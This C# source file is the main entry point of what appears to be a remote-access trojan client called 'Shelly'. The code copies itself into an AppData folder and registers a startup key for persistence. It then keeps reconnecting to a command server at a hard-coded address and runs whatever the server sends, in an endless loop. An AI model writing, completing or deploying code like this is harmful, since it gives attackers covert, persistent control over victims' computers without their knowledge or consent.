using System;
using System.IO;
using System.Threading;
using System.Reflection;

namespace Shelly_Client
{
    class Program
    {
        public const string ServerIp = "127.0.0.1";
        public const int ServerPort = 8500;

        // Get initial execution path
        public static string ExecutionPath = Directory.GetCurrentDirectory();

        // Get appdata path
        public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        static void Main(string[] args)
        {
            // Check if program is launched in system32 NOTE: Happens at startup
            if (ExecutionPath == Environment.SystemDirectory)
            {
                // Add startup key
                Functions.InstallMethods.StartupKey("Add");

                // Change path
                Directory.SetCurrentDirectory(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));

                // Set execution path to current path
                ExecutionPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            }

            // Check if file is installed, if not, install it
            if (ExecutionPath == Appdata + @"\Shelly")
            {
                TryToConnect:

                // Try to connect
                try
                {
                    SocketHandler.Connect();
                }
                catch
                {
                    // Wait, try again
                    Thread.Sleep(5000);
                    goto TryToConnect;
                }

                // Infinite loop
                while (true)
                {
                    // Try to read data
                    try
                    {
                        InputOutput.IO(SocketHandler.Receive());
                    }
                    catch
                    {
                        // Disconnect
                        SocketHandler.Disconnect();

                        // Goto TryToConnect
                        goto TryToConnect;
                    }
                }

            } else
            {
                // Install
                Functions.InstallMethods.Install();

                // Exit
                Environment.Exit(0);
            }
        }
    }
}
